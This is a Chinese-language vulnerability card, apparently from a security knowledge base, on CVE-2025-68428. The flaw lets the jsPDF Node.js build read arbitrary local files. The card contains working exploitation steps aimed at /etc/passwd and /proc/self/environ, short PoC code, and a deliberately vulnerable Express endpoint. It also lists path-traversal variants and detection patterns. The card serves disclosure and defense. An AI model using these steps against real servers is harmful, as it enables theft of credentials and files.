---
id: web-nodejs-jspdf-node-readfile-arbitrary-file-read
title: jsPDF Node.js nodeReadFile 任意文件读取：loadFile/addImage/html/addFont 路径直入 fs（CVE-2025-68428）
type: scenario
domain: web
path: web/nodejs
technique: jspdf-node-readfile-lfi
aliases:
- CVE-2025-68428
- GHSA-f8cm-6447-x5h2
- jsPDF 路径遍历
- jsPDF 任意文件读取
- nodeReadFile LFI
- jsPDF loadFile 漏洞
- jsPDF addImage 文件读取
tags:
- nodejs
- jspdf
- cve-2025-68428
- path-traversal
- arbitrary-file-read
- lfi
- npm
- pdf-generation
cve:
- CVE-2025-68428
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: jsPDF < 4.0.0（4.0.0 修复）
verification:
  verified_by: verifier-V56
  verified_at: '2026-11-05T08:47:17+08:00'
  notes: 已对照原文核对：CVE-2025-68428/GHSA、3.0.4 nodeReadFile 源码、4.0.0 修复逻辑、loadFile/addImage/html/addFont 可达路径均与原文及图片一致；原文 exploit.js 实为手动 fs.readFileSync 演示，非库调用，卡片已注明；PoC 未本地复跑。
---

## 一句话结论

jsPDF 的 Node.js 构建版把 `loadFile()` 的路径参数直接交给 `nodeReadFile(url)`，后者只做 `path.resolve(url)` 就调用 `fs.readFileSync`，没有 `..`、绝对路径或白名单限制；`loadFile`、`addImage`、`html`、`addFont` 都会走到这里，因此 Node 服务只要把请求中的图片/模板/字体路径传给这些方法，攻击者就能读取服务器任意文件并把内容嵌入返回的 PDF，形成可下载的数据泄露。

## 原理

- **浏览器语义与 Node 语义的错位**：jsPDF 原本是浏览器库，浏览器环境下“加载文件”受同源策略与沙箱限制；Node.js 构建版中 `nodeReadFile` 直接 `require("fs")`，`url` 从“受限的网络地址”变成“任意磁盘路径”，同一份代码在服务端获得了本地文件读取能力。
- **脆弱点**：
  ```js
  function nodeReadFile(url, sync, callback) {
      var fs = require("fs");
      var path = require("path");
      url = path.resolve(url);                 // 只把相对路径转成绝对路径
      result = fs.readFileSync(url, { encoding: "latin1" });  // 直接读，无白名单
      ...
  }
  ```
  `path.resolve` 会规范化 `..`/`.`，但**不会限制结果范围**：传入 `/etc/passwd` 或 `../../etc/passwd` 都解析为一个合法的绝对路径，随后被原样读取。函数没有 `startsWith`/`realpath`/权限检查。
- **可达方法**：`loadFile()` 是底层入口，`loadImageFile` 直接等于 `loadFile`；`addImage()`、`html()`、`addFont()` 内部都会调用 `loadFile()` 读取图片、HTML 模板或 TTF 字体文件。因此任一方法的路径参数可控都可触发。
- **数据外带通道**：读取结果以 latin1 返回，jsPDF 可把内容写进 PDF（例如作为文本、图片数据或模板内容）。当服务把生成的 PDF 返回给请求者时，本地文件内容就随 PDF 一起被带出；即使接口只返回“生成成功”，也可以通过下载链接或后续查询获取。
- **修复思路（4.0.0）**：
  ```js
  if (!process.permission && !this.allowFsRead) { throw new Error("..."); }
  url = fs.realpathSync(path.resolve(url));       // 解析软链接、归一化
  if (process.permission && !process.permission.has("fs.read", url)) throw ...;
  if (this.allowFsRead) { /* 通配符/精确路径白名单，startsWith(resolved) */ }
  ```
  修复引入两道闸门：Node 原生权限模型 `process.permission`（启动时 `--permission --allow-fs-read`）和库级 `allowFsRead` 白名单；先 `realpathSync` 再比较，避免用 `..` 或软链接绕过。`process.permission` 在进程启动时确定，JS 运行期无法自行提权，因此比纯 JS 黑名单更可靠。
- **为什么是“路径遍历/LFI”而不是 SSRF**：读取目标是本地文件系统路径，不是 URL；攻击者通过服务端 API 的路径参数控制 `url`，再由 PDF 输出通道回显内容。

## 触发条件

- 使用 jsPDF < 4.0.0 的 Node.js 构建（`require("jspdf/dist/jspdf.node.js")` 或服务端打包后的等价入口）。
- 业务代码把用户可控值传给 `loadFile()`、`addImage()`、`html()`、`addFont()` 或内部 `getFileData()`，例如 `doc.addImage(req.body.logoPath, ...)`、`doc.html(req.body.templatePath, ...)`。
- 服务进程对目标文件有读权限，且生成的 PDF 能被攻击者取回（直接响应、对象存储链接、邮件附件等）。
- 目标未升级到 4.0.0，或升级后错误地把 `allowFsRead` 配置为过宽（如 `/`、空字符串）且开启了 Node 权限模型。

## 利用步骤

1. 确认依赖版本：`npm ls jspdf` 或读取 `package-lock.json`/打包产物，判断是否 < 4.0.0。
2. 找可控路径点：接口参数进入 `addImage`/`html`/`addFont`/`loadFile` 的位置，常见字段名 `logoPath`、`templatePath`、`fontPath`、`image`、`template`。
3. 先传一个已知存在且无害的路径（如项目内图片）确认接口正常生成 PDF。
4. 传绝对路径或穿越路径读取目标文件：Linux `/etc/passwd`、`/proc/self/environ`；Windows `C:/Windows/win.ini`、`C:/Users/.../config`。
5. 下载生成的 PDF，检查文件内容是否被嵌入；若接口只返回文件名，找下载/预览接口取回。
6. 读取应用配置、环境变量、密钥文件，评估数据泄露范围。

## PoC

最小读取（同步路径）：

```js
const { jsPDF } = require("jspdf/dist/jspdf.node.js");

const doc = new jsPDF();
const p = "C:/Windows/win.ini";        // Linux 换成 /etc/passwd

// 直接走底层加载函数
const data = doc.loadFile(p);
console.log("read:", p, "bytes:", data && data.length);
console.log(data && data.toString().slice(0, 300));
```

服务端场景（示意）：

```js
app.post('/generate-invoice', (req, res) => {
  const doc = new jsPDF();
  doc.addImage(req.body.logoPath, 'PNG', 10, 10, 50, 50); // logoPath 可控 → LFI
  const pdf = doc.output('arraybuffer');
  res.type('application/pdf').send(Buffer.from(pdf));
});
```

说明：`loadFile` 的返回内容可直接打印验证；通过 `addImage`/`html` 触发时，文件内容会进入 PDF 渲染流程，最终需从 PDF 中提取。PoC 依据 3.0.4 源码构造，未在本地重新执行；测试时请使用自建环境与无害文件。

## 变体与关联

- **触发方法变体**：`addImage(path, ...)` 读取图片；`html(templatePath)` 读取 HTML 模板；`addFont(path)` 读取 TTF；`doc.internal.getFileData(path)` 是内部加载入口。路径可控的任一方法都可作为入口。
- **路径变体**：绝对路径最直接；相对路径用 `../` 向上跳；Windows 可用 `C:\`、`\\server\share`（若进程有网络共享权限）；Linux 可用 `/proc/self/environ`、`/proc/self/cwd/...`。
- **版本边界**：4.0.0 起默认禁止本地文件读取，除非显式 `allowFsRead` 或 Node `--permission --allow-fs-read`；升级后要检查旧代码是否设置了过宽的 `allowFsRead`（通配符前缀匹配按 `path.sep` 处理，配置 `/app/uploads*` 这类前缀仍需谨慎）。
- **组合升级**：读取到的配置文件/密钥可用于伪造会话或连接数据库；若服务端另有日志写入、模板渲染、反序列化等原语，LFI 可能进一步升级，但本卡只证明任意文件读取与 PDF 外带。
- 关联：[[web-nodejs-postcss-sourcemappingurl-arbitrary-file-read]]（Node.js 库路径参数任意文件读取的另一实例）；[[web-nodejs-n8n-form-content-type-confusion-file-read]]（Node 服务 filepath 参数无认证文件读取）；[[web-generic-file-inclusion-oa-logfiledownload-createfwfromjoa-arbitrary-read]]（服务端路径参数直入文件读取的通用形态）。

## 检测与防御

- **升级**：将 jsPDF 升到 >= 4.0.0；用锁文件与依赖扫描（npm audit、SCA）确认没有旧版本残留。CVE-2025-68428 / GHSA-f8cm-6447-x5h2。
- **配置**：4.0.0+ 若必须读本地文件，显式设置最小化 `allowFsRead`（只允许具体文件或限定目录），不要用 `/`、空串或过宽通配；生产环境用 Node `--permission` 并只授予必要目录的 `fs.read`。
- **代码**：不要把请求参数直接传给 `addImage`/`html`/`addFont`/`loadFile`；改为服务端预置的资源 ID/枚举，或先把文件下载到受控目录并校验真实路径位于允许根目录内。
- **检测特征**：PDF 生成接口参数含 `../`、`..\`、`/etc/`、`C:\`、`/proc/`、`WEB-INF`；响应 PDF 中出现系统文件片段（`[fonts]`、`root:x:` 等）；同一接口短时间内请求多个敏感路径；`npm ls jspdf` 显示 <4.0.0。
- **应急**：确认是否被读取过配置/密钥；轮换可能泄露的凭据；限制 PDF 生成接口的返回对象权限；对生成 PDF 的临时文件做访问控制与过期清理。
